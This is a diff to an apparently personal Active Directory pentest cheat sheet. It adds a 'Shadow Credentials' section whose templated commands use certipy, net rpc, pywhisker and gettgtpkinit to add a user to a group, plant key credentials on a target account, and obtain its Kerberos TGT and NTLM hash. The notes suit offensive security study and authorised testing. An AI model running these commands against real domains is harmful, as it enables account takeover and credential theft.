@@ -95,6 +95,20 @@ Enter-PSSession {PSSession_ID_returned}
   - Dumping and using tickets is one of Rubeus's strong suits
   - `Rubeus.exe triage` to list available tickets
 
+**Shadow Credentials**
+- Seems certipy is the go-to here: `certipy shadow -u "{user}@{domain}" -p {password} -dc-ip {dc_ip} -account '{target_user}' auto`
+- If we have GenericWrite over a user from a group
+  - If we need to add ourselves or a user to the group first via GenericAll, we can use `net` on kali
+  	- `net rpc group addmem '{target_group}' {user_to_add} -U '{domain}/{owned_user}%{password} -S '{dc_fqdn}'`
+  - We can then use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to add shadow credentials to the user
+	- `pywhisker -d "{domain}" -u "{owned_user}" -p "{owned_user_password}" --target "{target_user}" --action "add" --dc-ip {dc-ip} -f {filename} --pfx-password '{pfx_file_password}'`
+	- This gives us a pfx file for the user and a password for the pfx file
+  - Then, we use the pfx file with [gettgtpkinit](https://github.com/dirkjanm/PKINITtools) to get a ccache kerberos TGT
+	- `gettgtpkinit.py -cert-pfx {pfx_file} "{domain}/{target_user}" {user}.ccache -pfx-pass '{pfx_pass}' -dc-ip {dc_ip}`
+	- We could also use certipy, which gives us the user's NTLM hash as well
+	  - `certipy auth -pfx {pfx_file} -dc-ip {dc-ip} -domain {domain_name} -username {target_user}`
+	  	- Add `-no-save` if we don't want the ccache file
+
 **Abusing Domain Trusts**
 - Remember here that since we're using kerberos we have to use DNS instead of IPs
 - Gettind SIDs
